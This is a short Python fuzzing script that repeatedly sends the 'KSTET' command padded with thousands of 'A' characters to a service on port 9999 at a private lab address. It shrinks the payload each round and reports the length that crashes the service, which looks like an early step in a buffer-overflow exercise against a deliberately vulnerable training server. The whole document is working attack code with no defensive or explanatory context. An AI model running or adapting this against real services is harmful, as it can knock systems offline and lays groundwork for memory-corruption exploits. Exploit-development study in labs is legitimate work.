import socket
from time import sleep

count = 6000
 
while count >=10:

	TCP_IP = '192.168.109.129'
	TCP_PORT = 9999
	
	payload = "KSTET /.:/"
	payload += "A" * count
	
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((TCP_IP, TCP_PORT))
		s.settimeout(4.0)
		s.recv(1024)
	
	except:
		print("\nCrash Occured When Sending: {}".format(count))
		exit()

	s.send(payload)
	s.close()	
	
	count = count - 10
	print("Sending Message! - Count:" + str(count))
	s.close()
	print("Message Sent! - Count:" + str(count))
	sleep(3)